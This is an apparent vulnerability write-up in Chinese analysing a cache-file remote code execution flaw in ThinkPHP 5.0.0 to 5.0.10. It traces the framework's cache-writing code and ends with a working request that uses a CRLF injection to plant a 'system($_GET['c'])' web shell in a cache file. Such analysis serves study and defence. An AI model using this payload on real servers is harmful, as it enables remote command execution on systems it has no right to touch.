# TP5远程代码执行

Version: 5.0.0<=ThinkPHP5<=5.0.10

## 缓存文件写入

在Cache.php的set()中使用init()实例化一个对象并调用其set()方法

`````php
    public static function set($name, $value, $expire = null)
    {
        self::$writeTimes++;
        return self::init()->set($name, $value, $expire);
    }
`````

而init()如下,默认`$option=null`,所以`$connect=self::connect
(Config::get('cache'))`,该值默认为`File`

```php
    public static function init(array $options = [])
    {
        if (is_null(self::$handler)) {
            // 自动初始化缓存
            if (!empty($options)) {
                $connect = self::connect($options);
            } elseif ('complex' == Config::get('cache.type')) {
                $connect = self::connect(Config::get('cache.default'));
            } else {
                $connect = self::connect(Config::get('cache'));
            }
            self::$handler = $connect;
        }
        return self::$handler;
    }
```
而默认cahe的配置如下
```php
'cache'                  => [
        // 驱动方式
        'type'   => 'File',
        // 缓存保存目录
        'path'   => CACHE_PATH,
        // 缓存前缀
        'prefix' => '',
        // 缓存有效期 0表示永久缓存
        'expire' => 0,
    ],
```



connect()方法如下,根据默认配置$Option['type']=File,则$Class即为\think\cache\driver\File,最后即返回了一个该File类,则最后调用的是File类的set方法

```php
    public static function connect(array $options = [], $name = false)
    {
        $type = !empty($options['type']) ? $options['type'] : 'File';
        if (false === $name) {
            $name = md5(serialize($options));
        }

        if (true === $name || !isset(self::$instance[$name])) {
            $class = false !== strpos($type, '\\') ? $type : '\\think\\cache\\driver\\' . ucwords($type);

            // 记录初始化信息
            App::$debug && Log::record('[ CACHE ] INIT ' . $type, 'info');
            if (true === $name) {
                return new $class($options);
            } else {
                self::$instance[$name] = new $class($options);
            }
        }
        return self::$instance[$name];
    }
```

在File类中set()如下,在该类中的set方法中将$value的值进行序列化后与`<?php\n//" . sprintf('%012d', $expire)` 直接进行拼接写入文件,此处可以使用%0d%0a换行来逃逸序列化格式,从而写入任意内容

```php
    public function set($name, $value, $expire = null)
    {
        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }
        $filename = $this->getCacheKey($name);
        if ($this->tag && !is_file($filename)) {
            $first = true;
        }
        $data = serialize($value);
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }
        $data   = "<?php\n//" . sprintf('%012d', $expire) . $data . "\n?>";
        $result = file_put_contents($filename, $data);
        if ($result) {
            isset($first) && $this->setTagItem($filename);
            clearstatcache();
            return true;
        } else {
            return false;
        }
    }
```

而文件名是由getCachekey()获取,getCache()如下,根据传入的$name的md5值前两位作为目录名,后30位为文件名

```php
    protected function getCacheKey($name)
    {
        $name = md5($name);
        if ($this->options['cache_subdir']) {
            // 使用子目录
            $name = substr($name, 0, 2) . DS . substr($name, 2);
        }
        if ($this->options['prefix']) {
            $name = $this->options['prefix'] . DS . $name;
        }
        $filename = $this->options['path'] . $name . '.php';
        $dir      = dirname($filename);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        return $filename;
    }
```

创建测试代码如下,即$name为缓存的键名,username为序列化的值

```php
<?php
namespace app\index\controller;
use think\Cache;
class Index
{
    public function index()
    {
        Cache::set("name",input("get.username"));
        return 'Cache success';
    }
}
```

访问`http://localhost/index.php/index/index?username=aa222%0D%0Asystem($_GET[%27c%27]);//`即可写入缓存文件

![1](1.jpg)



1. 需要知道缓存的键值才能得到文件名
2. 缓存文件在runtime目录下,而一般网站目录在public目录下,无法访问到